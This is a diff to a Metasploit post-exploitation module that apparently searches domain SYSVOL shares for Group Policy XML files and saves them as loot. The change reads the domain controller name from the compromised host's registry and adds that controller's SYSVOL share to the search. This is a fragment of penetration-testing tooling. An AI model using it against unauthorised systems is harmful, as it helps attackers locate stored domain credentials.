@@ -47,6 +47,7 @@ class Metasploit3 < Msf::Post
 
 		register_options([
 			OptBool.new('ALL', [false, 'Enumerate all domains on network.', true]),
+			OptBool.new('PDC_USE_REGISTRY', [false, 'Use the target\'s PDC from registry.', true]),
 			OptBool.new('STORE', [false, 'Store the enumerated files in loot.', true]),
 			OptString.new('DOMAINS', [false, 'Enumerate list of space seperated domains DOMAINS="dom1 dom2".'])], self.class)
 	end
@@ -117,7 +118,23 @@ class Metasploit3 < Msf::Post
 				end
 			end
 		end
-
+		
+		if datastore['PDC_USE_REGISTRY']
+			begin
+				subkey = "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\History"
+				v_name = "DCName"
+				dc = registry_getvaldata(subkey, v_name)[2..-1]
+				print_status "Searching for Policy Share on #{dc}..."
+				tbase = get_basepaths("\\\\#{dc}\\SYSVOL")
+				unless tbase.blank?
+					print_good "Found Policy Share on #{dc}"
+					basepaths << tbase
+				end
+			rescue
+				print_error("This host is not part of a domain.")
+			end
+		end
+		
 		basepaths.flatten!
 		basepaths.compact!
 		print_status "Searching for Group Policy XML Files..."
